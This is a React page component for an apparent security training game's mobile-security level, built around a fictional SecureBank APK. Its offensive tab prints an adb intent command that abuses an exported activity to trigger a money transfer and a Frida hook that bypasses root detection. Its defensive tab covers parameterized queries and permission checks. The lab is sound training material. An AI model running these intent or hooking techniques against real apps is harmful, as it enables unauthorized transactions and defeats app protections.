import { Navigation } from "@/components/Navigation";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { useState } from "react";
import { Link } from "react-router-dom";
import { Home, ChevronLeft, ChevronRight, Smartphone, Shield, Code, Terminal, CheckCircle, AlertTriangle } from "lucide-react";

const Level13 = () => {
  const [activeTab, setActiveTab] = useState("overview");
  const [selectedComponent, setSelectedComponent] = useState("");
  const [manifestAnalysis, setManifestAnalysis] = useState(false);
  const [exportedActivity, setExportedActivity] = useState("");
  const [adbCommand, setAdbCommand] = useState("");
  const [intentCrafted, setIntentCrafted] = useState(false);
  const [fridaScript, setFridaScript] = useState("");
  const [rootBypass, setRootBypass] = useState(false);
  const [permissionCheck, setPermissionCheck] = useState("");
  const [exportedSetting, setExportedSetting] = useState(false);

  const components = {
    Activities: {
      description: "User interface screens - vulnerable to UI hijacking and intent injection",
      risk: "High - Can bypass authentication flows",
      example: "Malicious apps can launch sensitive activities directly"
    },
    Services: {
      description: "Background processes - can be exploited for persistent access",  
      risk: "Medium - May expose sensitive operations",
      example: "Unprotected services can be bound to by malicious apps"
    },
    "Broadcast Receivers": {
      description: "Listen for system/app events - vulnerable to intent sniffing",
      risk: "Medium - Can intercept sensitive broadcasts", 
      example: "Malicious apps can receive password reset broadcasts"
    },
    "Content Providers": {
      description: "Share data between apps - prone to information leakage",
      risk: "High - Direct database access possible",
      example: "SQL injection through exposed content providers"
    }
  };

  const manifestCode = `<activity
    android:name="com.securebank.TransferActivity"
    android:exported="true"
    android:theme="@style/AppTheme" />
    
<activity  
    android:name="com.securebank.LoginActivity"
    android:exported="false" />`;

  return (
    <div className="min-h-screen bg-background">
      <Navigation />
      <main className="pt-24 px-4">
        <div className="container mx-auto max-w-6xl">
          <div className="text-center mb-8">
            <div className="mb-4">
              <span className="text-primary text-sm font-semibold">INTERMEDIATE TRACK</span>
            </div>
            <h1 className="text-4xl font-bold mb-4 cyber-gradient">Level 13: Mobile Application Security</h1>
            <p className="text-xl text-muted-foreground">Find and exploit vulnerabilities in the palm of your hand.</p>
          </div>
          
          <div className="sticky top-20 z-40 glass border border-border/50 rounded-lg p-1 mb-8">
            <div className="flex space-x-1">
              {[
                { id: "overview", label: "1. Overview: The Mobile Attack Surface" }, 
                { id: "offensive", label: "2. Offensive Ops: Decompiling and Exploiting" }, 
                { id: "defensive", label: "3. Defensive Ops: Secure Mobile Development" }
              ].map((tab) => (
                <button 
                  key={tab.id} 
                  onClick={() => setActiveTab(tab.id)} 
                  className={`flex-1 px-4 py-2 rounded-md font-medium transition-all ${
                    activeTab === tab.id ? 'bg-primary text-primary-foreground' : 'text-muted-foreground hover:text-foreground'
                  }`}
                >
                  {tab.label}
                </button>
              ))}
            </div>
          </div>

          {activeTab === "overview" && (
            <div className="space-y-8">
              <Card className="glass border-primary/20">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Smartphone className="w-5 h-5 text-primary" />
                    The Android Security Model
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="grid lg:grid-cols-2 gap-8">
                    <div className="space-y-4">
                      <h3 className="text-xl font-semibold text-cyber-cyan">App Sandboxing</h3>
                      <div className="p-4 bg-black/50 rounded-lg">
                        <div className="space-y-3">
                          <div className="border border-cyan-500/30 p-3 rounded">
                            <div className="text-cyan-400 font-semibold">App A (UID: 10001)</div>
                            <div className="text-sm text-muted-foreground">Private data directory</div>
                            <div className="text-xs text-green-400">/data/data/com.app.a/</div>
                          </div>
                          <div className="border border-purple-500/30 p-3 rounded">
                            <div className="text-purple-400 font-semibold">App B (UID: 10002)</div>
                            <div className="text-sm text-muted-foreground">Private data directory</div>
                            <div className="text-xs text-green-400">/data/data/com.app.b/</div>
                          </div>
                          <div className="border border-orange-500/30 p-3 rounded">
                            <div className="text-orange-400 font-semibold">Linux Kernel</div>
                            <div className="text-sm text-muted-foreground">Process isolation enforcement</div>
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    <div className="space-y-4">
                      <h3 className="text-xl font-semibold text-cyber-purple">Permissions Model</h3>
                      <div className="space-y-3">
                        <div className="p-3 bg-cyber-purple/10 border border-cyber-purple/30 rounded-lg">
                          <div className="font-semibold text-cyber-purple mb-2">Install-time Permissions</div>
                          <div className="text-sm">
                            Declared in AndroidManifest.xml, granted at installation
                          </div>
                          <div className="text-xs text-muted-foreground mt-1">
                            CAMERA, LOCATION, STORAGE
                          </div>
                        </div>
                        <div className="p-3 bg-cyber-magenta/10 border border-cyber-magenta/30 rounded-lg">
                          <div className="font-semibold text-cyber-magenta mb-2">Runtime Permissions</div>
                          <div className="text-sm">
                            Requested when needed, user can grant/deny
                          </div>
                          <div className="text-xs text-muted-foreground mt-1">
                            Android 6.0+ dangerous permissions
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  
                  <div className="space-y-4">
                    <h3 className="text-xl font-semibold text-cyber-magenta">Application Components & Attack Vectors</h3>
                    <div className="grid md:grid-cols-2 gap-4">
                      {Object.entries(components).map(([component, info]) => (
                        <div 
                          key={component}
                          className={`p-4 border rounded-lg cursor-pointer transition-all ${
                            selectedComponent === component 
                              ? 'border-primary bg-primary/10' 
                              : 'border-border/50 hover:border-primary/50'
                          }`}
                          onClick={() => setSelectedComponent(selectedComponent === component ? "" : component)}
                        >
                          <h4 className="font-semibold text-primary mb-2">{component}</h4>
                          <p className="text-sm text-muted-foreground mb-2">{info.description}</p>
                          {selectedComponent === component && (
                            <div className="space-y-2 animate-fade-in">
                              <div className="text-sm">
                                <span className="font-semibold text-red-400">Risk Level:</span> {info.risk}
                              </div>
                              <div className="text-sm">
                                <span className="font-semibold text-yellow-400">Example:</span> {info.example}
                              </div>
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                  
                  <div className="p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-lg">
                    <h4 className="font-semibold text-yellow-400 mb-3">Static vs Dynamic Analysis</h4>
                    <div className="grid md:grid-cols-2 gap-4 text-sm">
                      <div>
                        <div className="font-semibold mb-2 text-cyan-400">Static Analysis</div>
                        <div className="space-y-1">
                          <div><code className="text-xs bg-black/30 px-1 rounded">jadx</code> - Java decompiler</div>
                          <div><code className="text-xs bg-black/30 px-1 rounded">apktool</code> - Resource extraction</div>
                          <div className="text-muted-foreground">Analyze without running</div>
                        </div>
                      </div>
                      <div>
                        <div className="font-semibold mb-2 text-purple-400">Dynamic Analysis</div>
                        <div className="space-y-1">
                          <div><code className="text-xs bg-black/30 px-1 rounded">Frida</code> - Runtime instrumentation</div>
                          <div><code className="text-xs bg-black/30 px-1 rounded">adb</code> - Android Debug Bridge</div>
                          <div className="text-muted-foreground">Analyze during execution</div>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          {activeTab === "offensive" && (
            <div className="space-y-8">
              <Card className="glass border-red-500/20">
                <CardHeader>
                  <CardTitle className="text-red-400 flex items-center gap-2">
                    <Code className="w-5 h-5" />
                    SecureBank APK Analysis Lab
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  {/* Stage 1: Static Analysis */}
                  <div className="space-y-4">
                    <h4 className="font-semibold text-red-400">Stage 1: Static Analysis</h4>
                    <div className="grid lg:grid-cols-2 gap-6">
                      <div className="space-y-3">
                        <div className="p-4 bg-black/50 rounded-lg">
                          <div className="text-green-400 font-mono mb-2">$ jadx-gui SecureBank.apk</div>
                          <div className="text-sm text-muted-foreground mb-3">Decompiling APK... Analyzing AndroidManifest.xml</div>
                          
                          <div className="bg-gray-900 p-3 rounded text-xs font-mono">
                            <div className="text-blue-400">&lt;manifest&gt;</div>
                            <div className="ml-2">{manifestCode.split('\n').map((line, i) => (
                              <div key={i} className={line.includes('exported="true"') ? 'text-red-400' : 'text-white'}>
                                {line}
                              </div>
                            ))}</div>
                            <div className="text-blue-400">&lt;/manifest&gt;</div>
                          </div>
                        </div>
                        
                        <div className="space-y-2">
                          <div className="text-sm font-semibold">Find the exported Activity that bypasses authentication:</div>
                          <Input 
                            value={exportedActivity}
                            onChange={(e) => setExportedActivity(e.target.value)}
                            placeholder="Enter the vulnerable activity name..."
                            className="font-mono text-sm"
                          />
                          <Button 
                            onClick={() => {
                              if (exportedActivity.includes("TransferActivity")) {
                                setManifestAnalysis(true);
                              }
                            }}
                            size="sm"
                          >
                            Analyze
                          </Button>
                        </div>
                      </div>
                      
                      <div className="space-y-3">
                        {manifestAnalysis && (
                          <div className="p-4 bg-green-500/20 border border-green-500/50 rounded-lg animate-fade-in">
                            <div className="text-green-400 font-semibold flex items-center gap-2 mb-2">
                              <CheckCircle className="w-4 h-4" />
                              Vulnerability Found!
                            </div>
                            <div className="text-sm space-y-1">
                              <div><strong>Activity:</strong> com.securebank.TransferActivity</div>
                              <div><strong>Issue:</strong> android:exported="true"</div>
                              <div><strong>Impact:</strong> Can be launched directly by external apps</div>
                            </div>
                          </div>
                        )}
                        
                        {!manifestAnalysis && (
                          <div className="p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-lg">
                            <div className="text-yellow-400 font-semibold mb-2">💡 Analysis Hint:</div>
                            <div className="text-sm">
                              Look for Activities with <code>android:exported="true"</code> that don't require permissions.
                              These can be launched directly by malicious apps.
                            </div>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>

                  {/* Stage 2: Intent Exploitation */}
                  {manifestAnalysis && (
                    <div className="space-y-4 animate-fade-in">
                      <h4 className="font-semibold text-red-400">Stage 2: Intent Exploitation</h4>
                      <div className="grid lg:grid-cols-2 gap-6">
                        <div className="space-y-3">
                          <div className="p-4 bg-black/50 rounded-lg">
                            <div className="text-green-400 font-mono mb-2">adb shell</div>
                            <div className="text-sm text-muted-foreground mb-3">Craft malicious intent to bypass login...</div>
                            
                            <Textarea 
                              value={adbCommand}
                              onChange={(e) => setAdbCommand(e.target.value)}
                              placeholder={`am start -n com.securebank/.TransferActivity \\
  --es "sender" "attacker@evil.com" \\
  --es "recipient" "victim@bank.com" \\
  --ei "amount" 10000`}
                              className="bg-gray-900 text-green-400 font-mono text-xs"
                              rows={4}
                            />
                            
                            <Button 
                              onClick={() => {
                                if (adbCommand.includes("am start") && adbCommand.includes("TransferActivity") && 
                                    adbCommand.includes("--es") && adbCommand.includes("--ei")) {
                                  setIntentCrafted(true);
                                }
                              }}
                              className="mt-3"
                              size="sm"
                            >
                              Execute Intent
                            </Button>
                          </div>
                        </div>
                        
                        <div className="space-y-3">
                          {intentCrafted && (
                            <div className="p-4 bg-green-500/20 border border-green-500/50 rounded-lg">
                              <div className="text-green-400 font-semibold mb-2">🎯 Transfer Successful!</div>
                              <div className="bg-black/50 p-3 rounded text-sm font-mono">
                                <div className="text-green-400">SecureBank Transfer</div>
                                <div className="text-white">From: attacker@evil.com</div>
                                <div className="text-white">To: victim@bank.com</div>
                                <div className="text-yellow-400">Amount: $10,000.00</div>
                                <div className="text-green-400 mt-2">Status: COMPLETED</div>
                              </div>
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Stage 3: Frida Root Bypass */}
                  {intentCrafted && (
                    <div className="space-y-4 animate-fade-in">
                      <h4 className="font-semibold text-red-400">Stage 3: Frida Root Detection Bypass</h4>
                      <div className="grid lg:grid-cols-2 gap-6">
                        <div className="space-y-3">
                          <div className="text-sm font-semibold">Root Detection Code Analysis:</div>
                          <div className="bg-black/50 p-3 rounded font-mono text-xs">
                            <div className="text-green-400">public boolean isDeviceRooted() {"{"}</div>
                            <div className="text-white ml-4">String buildTags = Build.TAGS;</div>
                            <div className="text-white ml-4">return buildTags != null && buildTags.contains("test-keys");</div>
                            <div className="text-green-400">{"}"}</div>
                          </div>
                          
                          <div className="text-sm font-semibold">Frida Hook Script:</div>
                          <Textarea 
                            value={fridaScript}
                            onChange={(e) => setFridaScript(e.target.value)}
                            placeholder={`Java.perform(function() {
    var MainActivity = Java.use("com.securebank.MainActivity");
    MainActivity.isDeviceRooted.implementation = function() {
        console.log("Root check bypassed!");
        return false;
    };
});`}
                            className="bg-gray-900 text-green-400 font-mono text-xs"
                            rows={6}
                          />
                          
                          <Button 
                            onClick={() => {
                              if (fridaScript.includes("isDeviceRooted") && fridaScript.includes("return false")) {
                                setRootBypass(true);
                              }
                            }}
                            size="sm"
                          >
                            Hook Function
                          </Button>
                        </div>
                        
                        <div className="space-y-3">
                          {rootBypass && (
                            <div className="p-4 bg-green-500/20 border border-green-500/50 rounded-lg">
                              <div className="text-green-400 font-semibold mb-2">🔓 Root Detection Bypassed!</div>
                              <div className="bg-black/50 p-3 rounded text-sm font-mono">
                                <div className="text-green-400">frida -U -f com.securebank -l hook.js</div>
                                <div className="text-white">Spawning app...</div>
                                <div className="text-yellow-400">Hook installed successfully</div>
                                <div className="text-cyan-400">Root check bypassed!</div>
                                <div className="text-green-400">App launched normally</div>
                              </div>
                              <div className="text-sm mt-2 text-green-300">
                                ✅ Complete mobile compromise achieved - authentication bypass + root detection bypass
                              </div>
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          )}

          {activeTab === "defensive" && (
            <div className="space-y-8">
              <Card className="glass border-blue-500/20">
                <CardHeader>
                  <CardTitle className="text-blue-400 flex items-center gap-2">
                    <Shield className="w-5 h-5" />
                    Secure Mobile Development
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="grid lg:grid-cols-2 gap-6">
                    {/* Challenge 1: Content Provider Security */}
                    <div className="space-y-4">
                      <h4 className="font-semibold text-blue-400">Challenge 1: Fixing SQL Injection</h4>
                      <div className="p-4 bg-red-500/10 border border-red-500/30 rounded-lg">
                        <div className="text-red-400 font-semibold mb-2">⚠️ Vulnerable Code</div>
                        <div className="bg-black/50 p-3 rounded text-xs font-mono">
                          <div className="text-gray-400">// Vulnerable Content Provider</div>
                          <div className="text-white">String query = "SELECT * FROM users WHERE id=" + userInput;</div>
                          <div className="text-white">cursor = db.rawQuery(query, null);</div>
                        </div>
                      </div>
                      
                      <div className="space-y-3">
                        <div className="text-sm font-semibold">Select the secure implementation:</div>
                        <div className="space-y-2">
                          <label className="flex items-start gap-3 p-3 border border-border/50 rounded cursor-pointer hover:border-primary/50">
                            <input 
                              type="radio" 
                              name="contentProvider" 
                              onChange={() => setPermissionCheck("wrong1")}
                            />
                            <span className="text-sm">String query = "SELECT * FROM users WHERE id=" + sanitize(userInput); cursor = db.rawQuery(query, null);</span>
                          </label>
                          <label className="flex items-start gap-3 p-3 border border-border/50 rounded cursor-pointer hover:border-primary/50">
                            <input 
                              type="radio" 
                              name="contentProvider" 
                              onChange={() => setPermissionCheck("correct")}
                            />
                            <span className="text-sm">String query = "SELECT * FROM users WHERE id=?"; cursor = db.rawQuery(query, new String[]{"{userInput}"});</span>
                          </label>
                          <label className="flex items-start gap-3 p-3 border border-border/50 rounded cursor-pointer hover:border-primary/50">
                            <input 
                              type="radio" 
                              name="contentProvider" 
                              onChange={() => setPermissionCheck("wrong2")}
                            />
                            <span className="text-sm">String query = "SELECT * FROM users WHERE id='" + userInput.replace("'", "") + "'"; cursor = db.rawQuery(query, null);</span>
                          </label>
                        </div>
                        
                        {permissionCheck === "correct" && (
                          <div className="p-3 bg-green-500/20 border border-green-500/50 rounded-lg">
                            <div className="text-green-400 font-semibold">✅ Correct!</div>
                            <div className="text-sm mt-1">Parameterized queries prevent SQL injection by separating data from code.</div>
                          </div>
                        )}
                        
                        {permissionCheck && permissionCheck !== "correct" && (
                          <div className="p-3 bg-red-500/20 border border-red-500/50 rounded-lg">
                            <div className="text-red-400 font-semibold">❌ Still Vulnerable</div>
                            <div className="text-sm mt-1">Try using parameterized queries with placeholders (?).</div>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Challenge 2: Intent Security */}
                    <div className="space-y-4">
                      <h4 className="font-semibold text-blue-400">Challenge 2: Securing Intents</h4>
                      <div className="space-y-3">
                        <div className="text-sm font-semibold">Add permission check to TransferActivity:</div>
                        <div className="bg-black/50 p-3 rounded text-xs font-mono">
                          <div className="text-blue-400">@Override</div>
                          <div className="text-white">protected void onCreate(Bundle savedInstanceState) {"{"}</div>
                          <div className="text-gray-400 ml-4">// Add security check here</div>
                          <div className="text-white ml-4">super.onCreate(savedInstanceState);</div>
                          <div className="text-white">{"}"}</div>
                        </div>
                        
                        <Textarea 
                          placeholder={`if (checkCallingPermission("com.securebank.TRANSFER") != PackageManager.PERMISSION_GRANTED) {
    finish();
    return;
}`}
                          className="bg-gray-900 text-green-400 font-mono text-xs"
                          rows={4}
                        />
                        
                        <div className="flex items-center gap-3">
                          <input 
                            type="checkbox" 
                            id="exported"
                            checked={exportedSetting}
                            onChange={(e) => setExportedSetting(e.target.checked)}
                            className="w-4 h-4"
                          />
                          <label htmlFor="exported" className="text-sm font-semibold">
                            Set android:exported="false" in AndroidManifest.xml
                          </label>
                        </div>
                        
                        {exportedSetting && (
                          <div className="p-3 bg-green-500/20 border border-green-500/50 rounded-lg">
                            <div className="text-green-400 font-semibold">✅ Security Enhanced!</div>
                            <div className="text-sm mt-1">
                              Combined permission checks and proper export settings prevent unauthorized access.
                            </div>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                  
                  {permissionCheck === "correct" && exportedSetting && (
                    <div className="p-4 bg-green-500/20 border border-green-500/50 rounded-lg">
                      <div className="text-green-400 font-semibold flex items-center gap-2">
                        <CheckCircle className="w-5 h-5" />
                        Mobile Security Hardening Complete!
                      </div>
                      <div className="text-sm mt-2">
                        You've successfully implemented proper input validation and access control mechanisms 
                        to secure the mobile application against common attack vectors.
                      </div>
                    </div>
                  )}
                  
                  <div className="p-4 bg-blue-500/10 border border-blue-500/30 rounded-lg">
                    <h4 className="font-semibold text-blue-400 mb-3">Additional Mobile Security Best Practices:</h4>
                    <div className="grid md:grid-cols-2 gap-4 text-sm">
                      <div className="space-y-2">
                        <div className="font-semibold">Code Obfuscation</div>
                        <div className="text-muted-foreground">Use tools like ProGuard to make reverse engineering more difficult</div>
                        
                        <div className="font-semibold">Certificate Pinning</div>
                        <div className="text-muted-foreground">Pin SSL certificates to prevent man-in-the-middle attacks</div>
                      </div>
                      <div className="space-y-2">
                        <div className="font-semibold">Runtime Application Self-Protection (RASP)</div>
                        <div className="text-muted-foreground">Detect and respond to runtime attacks and tampering</div>
                        
                        <div className="font-semibold">Secure Key Storage</div>
                        <div className="text-muted-foreground">Use Android Keystore for cryptographic key management</div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          <div className="flex justify-between items-center py-8">
            <Button asChild variant="cyber-ghost" size="lg">
              <Link to="/level/12" className="flex items-center gap-2">
                <ChevronLeft className="w-4 h-4" />
                Previous
              </Link>
            </Button>
            <Button asChild variant="cyber-ghost" size="lg">
              <Link to="/" className="flex items-center gap-2">
                <Home className="w-4 h-4" />
                Home
              </Link>
            </Button>
            <Button asChild variant="cyber" size="lg">
              <Link to="/level/14" className="flex items-center gap-2">
                Next Level
                <ChevronRight className="w-4 h-4" />
              </Link>
            </Button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Level13;